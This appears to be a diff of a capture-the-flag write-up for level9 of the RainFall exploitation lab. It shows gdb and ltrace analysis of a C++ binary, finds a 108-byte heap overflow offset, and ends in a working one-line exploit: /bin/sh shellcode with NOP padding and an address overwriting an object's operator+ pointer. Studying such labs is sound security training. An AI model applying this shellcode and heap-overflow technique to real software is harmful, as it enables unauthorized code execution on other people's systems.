@@ -1,25 +1,129 @@
 (python -c 'print "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*85 + "\x0c\xa0\x04\x08"' ; cat) | ./level9
-As usual we decompilate the program to read the source code easyly.
+As usual we decompilate the program to read the source code easyly. --> To bad not working this time..
+We have to use multiple decompilator in dogbolt and to do some asm analysis to understand what is appening in the program.
+
+With this analysis we create our source.cpp file. But we need some additional information that we find with :
+info functions
+All defined functions:
+
+Non-debugging symbols:
+0x08048464  _init
+0x080484b0  __cxa_atexit
+0x080484b0  __cxa_atexit@plt
+0x080484c0  __gmon_start__
+0x080484c0  __gmon_start__@plt
+0x080484d0  std::ios_base::Init::Init()
+0x080484d0  _ZNSt8ios_base4InitC1Ev@plt
+0x080484e0  __libc_start_main
+0x080484e0  __libc_start_main@plt
+0x080484f0  _exit
+0x080484f0  _exit@plt
+0x08048500  _ZNSt8ios_base4InitD1Ev
+0x08048500  _ZNSt8ios_base4InitD1Ev@plt
+0x08048510  memcpy
+0x08048510  memcpy@plt
+0x08048520  strlen
+0x08048520  strlen@plt
+0x08048530  operator new(unsigned int)
+0x08048530  _Znwj@plt
+0x08048540  _start
+0x08048570  __do_global_dtors_aux
+0x080485d0  frame_dummy
+0x080485f4  main
+0x0804869a  __static_initialization_and_destruction_0(int, int)
+0x080486da  _GLOBAL__sub_I_main
+0x080486f6  N::N(int)
+0x080486f6  N::N(int)
+0x0804870e  N::setAnnotation(char*)
+0x0804873a  N::operator+(N&)
+0x0804874e  N::operator-(N&)
+0x08048770  __libc_csu_init
+0x080487e0  __libc_csu_fini
+0x080487e2  __i686.get_pc_thunk.bx
+0x080487f0  __do_global_ctors_aux
+0x0804881c  _fini
+
+We see that we have N::setAnnotation(char*), N::N(int), N::setAnnotation(char*), strlen
+N::operator+(N&), N::operator-(N&).
+We know that we have a function who is called at the end of this function but we don t know which one.
+let s find this with gdb :
+gdb ./level9
+(gdb) b *main+159
+Breakpoint 1 at 0x8048693
+(gdb) run aaaaaaaaaaaaa
+(gdb) print $edx
+$1 = 134514490
+
+>>> 134514490
+134514490
+>>> hex(134514490)
+'0x804873a'
+
+(gdb) n
+Single stepping until exit from function main,
+which has no line number information.
+0xb7d604d3 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6
+(gdb) n
+Single stepping until exit from function __libc_start_main,
+which has no line number information.
+[Inferior 1 (process 2626) exited with code 013]
+(gdb) n
+The program is not being run.
+(gdb) b *0x0804873a
+Breakpoint 2 at 0x804873a
+(gdb) run aaaaaaaaa
+Starting program: /home/user/level9/level9 aaaaaaaaa
+
+Breakpoint 1, 0x08048693 in main ()
+(gdb) print $edx
+$2 = 134514490
+(gdb) n
+Single stepping until exit from function main,
+which has no line number information.
+
+Breakpoint 2, 0x0804873a in N::operator+(N&) ()
+
+
+
 We can see that the program allocate two var with new : n1 and n2.
 And n1 is allocated with argv[1], passed into setAnnotation, the information of argv[1] is writed with memcpy.
 
 1) Find the offset :
-gdb ./level9 
+
+                                                                                                                      HERE
+gdb ./level9                                                                                                          ----
 (gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
 Starting program: /home/user/level9/level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
 
 Program received signal SIGSEGV, Segmentation fault.
 0x08048682 in main ()
-(gdb) info register eax
-eax            0x41366441	1094083649
+(gdb) info register
+eax            0x41366441	1094083649     <--- 0x41 = A, 0x36 = 6, 0x64 = d, 0x41 = A (We read in the inverse order)
+ecx            0x67413567	1732326759
+edx            0x804a0d4	134521044
+ebx            0x804a078	134520952
+esp            0xbffff640	0xbffff640
+ebp            0xbffff668	0xbffff668
+esi            0x0	0
+edi            0x0	0
+eip            0x8048682	0x8048682 <main+142>
+eflags         0x210287	[ CF PF SF IF RF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
 
-Like this we found the offset 0x41366441 = 108
+Like this we found the offset 0x41366441 = 108 (https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/)
 
 2) Like in level2 we need to inject shellcode and overflow the buffer.
 Here we need to overflow with 108 --> The space between n1 and n2.
-So if we overflow n1, we will overwrite n2, and we will be able to call the shellcode injected because n2 is called at the end of the program (in the return statement).
+So if we overflow n1, we will overwrite the n2 operator+, and we will be able to call the shellcode injected
+because n2->operator+ is called at the end of the program (in the return statement).
+(We know that the heap is chucked for class in c++)
 To summerize : 
-return ((n2_ptr)->operator+(*n1_ptr));
+return ((n2_ptr)->operator+(*n1_ptr));       --> return (n2_ptr)->shellcode
 The operator+ of n2_ptr is called,
 if we overflow n1_ptr and overwrite this operator+ of n2, we will be able to call our shellcode --> WIN
 We are in the heap but our variable are allocated contiguously so we can overflow n1 and overwrite n2.
@@ -59,7 +163,6 @@ Dump of assembler code for function main:
    0x08048664 <+112>:	mov    0xc(%ebp),%eax
    0x08048667 <+115>:	add    $0x4,%eax
    0x0804866a <+118>:	mov    (%eax),%eax
----Type <return> to continue, or q <return> to quit---
    0x0804866c <+120>:	mov    %eax,0x4(%esp)
    0x08048670 <+124>:	mov    0x14(%esp),%eax
    0x08048674 <+128>:	mov    %eax,(%esp)
@@ -76,36 +179,7 @@ Dump of assembler code for function main:
    0x08048698 <+164>:	leave  
    0x08048699 <+165>:	ret 
 
-We are going to break after the call of the function N::setAnnotation(char *s) :
-(gdb) break *0x0804867c
-(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-(gdb) x/x $esp
-0xbffff6c0:	0x0804a008
-"x" is the command in GDB for examining memory.
-"/x" is the format specifier that specifies how the memory should be displayed. In this case, "/x" indicates that the memory should be displayed in hexadecimal format.
-"$esp" refers to the value stored in the %esp register
-
-3) Now we want to know where we start to write in the memory, we will use (Same in the level6) :
-
-(gdb) x/20x 0x0804a008
-0x804a008:	0x08048848	0x41414141	0x41414141	0x41414141
-0x804a018:	0x41414141	0x41414141	0x41414141	0x41414141
-0x804a028:	0x41414141	0x41414141	0x41414141	0x41414141
-0x804a038:	0x41414141	0x41414141	0x41414141	0x41414141
-0x804a048:	0x41414141	0x41414141	0x00000000	0x00000000
-
-We see that we start to write 4 bytes after the address 0x0804a008.
-Let s use python to calculate our new address :
-
->>> 0x0804a008		---> convert hexa to decimal
-134520840
->>> 134520840 + 4 	---> add 4 to the address in decimal
-134520844
->>> hex(134520844) 	---> convert decimal to hexa
-'0x804a00c'			---> it s the address of our buffer.
->>> 
-
-We can also do it in an other way, with ltrace : 
+3) We use ltrace : 
 level9@RainFall:~$ ltrace ./level9 AAAAAAAAAAAAAAAAAAAA
 __libc_start_main(0x80485f4, 2, 0xbffff7d4, 0x8048770, 0x80487e0 <unfinished ...>
 _ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330) = 0xb7fce990
@@ -113,7 +187,7 @@ __cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330)           
 _Znwj(108, 0xbffff7d4, 0xbffff7e0, 0xb7d79e55, 0xb7fed280)                        = 0x804a008
 _Znwj(108, 5, 0xbffff7e0, 0xb7d79e55, 0xb7fed280)                                 = 0x804a078
 strlen("AAAAAAAAAAAAAAAAAAAA")                                                    = 20
-memcpy(0x0804a00c, "AAAAAAAAAAAAAAAAAAAA", 20)                                    = 0x0804a00c		---> We have the same result
+memcpy(0x0804a00c, "AAAAAAAAAAAAAAAAAAAA", 20)                                    = 0x0804a00c		---> This is the good address
 _ZNSt8ios_base4InitD1Ev(0x8049bb4, 11, 0x804a078, 0x8048738, 0x804a00c)           = 0xb7fce4a0
 +++ exited (status 11) +++
 level9@RainFall:~$ 
